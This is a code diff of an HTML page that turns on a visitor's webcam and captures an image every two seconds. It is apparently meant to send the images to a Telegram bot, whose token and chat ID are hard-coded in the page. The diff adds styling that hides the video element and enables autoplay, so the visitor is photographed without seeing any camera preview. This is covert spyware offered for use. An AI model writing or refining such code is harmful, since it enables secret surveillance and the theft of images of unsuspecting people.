@@ -2,11 +2,16 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        #video {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-    <video id="video" width="640" height="480" ></video>
+    <video id="video" width="640" height="480" autoplay></video>
     <script>
         const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw'; // আপনার টেলিগ্রাম বট টোকেন এখানে দিন
         const chatId = '5125698617'; // আপনার চ্যাট আইডি এখানে দিন
@@ -14,10 +19,14 @@
         async function startVideo() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                setInterval(() => {
-                    captureImage();
-                }, 2000); // Adjusted to 2000 ms (2 seconds)
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+                
+                videoElement.addEventListener('canplay', () => {
+                    setInterval(() => {
+                        captureImage();
+                    }, 2000); // Adjusted to 2000 ms (2 seconds)
+                });
             } catch (error) {
                 console.error("Error accessing camera: ", error);
             }
